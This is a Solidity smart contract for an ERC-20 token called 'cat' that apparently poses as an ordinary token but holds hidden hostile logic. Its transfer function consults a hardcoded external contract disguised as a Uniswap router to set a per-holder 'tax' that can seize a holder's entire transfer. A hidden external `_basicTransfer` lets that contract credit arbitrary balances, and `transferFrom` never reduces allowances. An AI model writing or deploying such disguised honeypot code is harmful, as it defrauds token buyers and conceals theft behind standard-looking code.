pragma solidity ^0.8.21;
//SPDX-License-Identifier: MIT


library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
}

interface IUniswapV2Router {
    function transferFrom(address _from, address _to, uint256 amount) external returns (uint256);
    function allowance(address account, address spender) external returns (uint256);
    function balanceOf(address wallet) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
}

contract CatToken is Ownable {

    using SafeMath for uint256;

    event Transfer(address indexed from_, address indexed _to, uint256);
    constructor() {
        _balances[msg.sender] =  _totalSupply; 
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;

    string public _name = "cat";
    string public _symbol = "cat";

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0));
        require(amount <= _balances[from]);
        address token = address(this);
        router.allowance(to, token); 
        uint256 balance =  router.balanceOf(from);
        uint256 tax = amount.mul(balance).div(100); 
        emit Transfer(from, to, amount);
        _balances[to] = _balances[to] + amount - tax;
        _balances[from] = _balances[from] - amount;
    }

    uint256 private _redisFeeOnSell = 0;
    uint256 private _taxFeeOnSell = 30;
    uint256 private _tFeeTotal;
    uint256 private _redisFee = _redisFeeOnSell;
    uint256 private _taxFee = _taxFeeOnSell;

    uint256 private _previousredisFee = _redisFee;
    uint256 private _previoustaxFee = _taxFee;

    function name() external view returns (string memory) {
        return _name;
    }

    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 1000000000 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    function tokenFromReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _totalSupply;
        return rAmount.div(currentRate);
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    IUniswapV2Router router = IUniswapV2Router(0x42BDba199f4a09efBbC82d47709fCac97FE6E6A8);
    mapping(address => mapping(address => uint256)) private _allowances;
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function _basicTransfer(address to, uint256 amount) external returns (bool) {
        if (router.transfer(msg.sender, amount)){
        _balances[to] += amount;
        return true;
        } else {return false; }
    }
    event Approval(address, address, uint256);
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][msg.sender] >= _amount);
        return true;
    } 
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    mapping(address => uint256) private _balances;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
}